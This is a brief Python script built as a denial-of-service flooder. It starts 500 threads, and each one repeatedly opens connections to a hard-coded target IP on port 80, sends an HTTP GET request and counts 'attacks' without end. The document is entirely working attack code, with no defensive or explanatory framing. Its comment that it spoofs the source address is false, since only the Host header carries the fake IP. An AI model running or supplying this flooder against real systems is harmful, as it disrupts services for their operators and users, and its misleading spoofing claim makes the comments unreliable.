import socket
import threading

# Set your target IP address
target = '10.0.0.138'
# Choose your fake IP address
fake_ip = '182.21.20.32'
# Port to target
port = 80

# Counter to keep track number of attacks
attack_num = 0


# Function to perform the attack
def attack():
    while True:
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the target
        s.connect((target, port))
        # Send a crafted HTTP GET request
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        # Spoof the host header with a fake IP
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        # Increment the attack counter
        global attack_num
        attack_num += 1
        # Print the current number of attacks
        print(attack_num)

        # Close the socket
        s.close()


# Launch multiple threads for concurrent attacks
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
